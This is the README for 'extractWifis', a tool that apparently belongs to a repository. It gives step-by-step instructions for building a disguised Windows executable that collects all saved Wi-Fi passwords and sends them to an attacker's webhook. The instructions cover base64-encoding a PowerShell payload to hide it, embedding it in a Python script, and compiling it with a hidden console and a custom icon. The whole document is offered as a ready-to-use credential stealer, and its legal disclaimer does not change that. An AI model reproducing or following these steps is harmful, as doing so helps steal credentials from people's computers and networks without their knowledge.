# extractWifis

Exfiltrate all saved Wi-Fi passwords from Windows

## Requirements

1. On your Windows machine install Python https://www.python.org/downloads/
 
2. Install pyinstaller `C:\> pip install pyinstaller`

3. Create a webhook
- https://requestinspector.com
- https://beeceptor.com
- https://webhook.site


## Instructions

1. Open  `getwifis.ps1` and replace `WEBHOOK_URL_HERE` with your webhook url.

2. Encode Powershell  
- Linux command:
```bash
iconv -f ASCII -t UTF-16LE getwifis.ps1 | base64 -w0
```

- Powershell command (you must remove new lines):
```powershell
$data = Get-Content C:\getwifis.ps1
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
```

3. Open `script.py` and replace `B64_HERE` with your base64 code.

4. Create executable
```cmd
c:\> pyinstaller --onefile --noconsole --icon=icon.ico script.py
```

Executable will be placed on `dist` folder

## Disclaimer
Usage of these scripts for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Support
[<img width=300 alt="patreon" src="https://i0.wp.com/thegoodhackertv.com/wp-content/uploads/2020/11/patreon.png">](https://www.patreon.com/thegoodhacker)
[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-orange.png">](https://www.buymeacoffee.com/thegoodhacker)
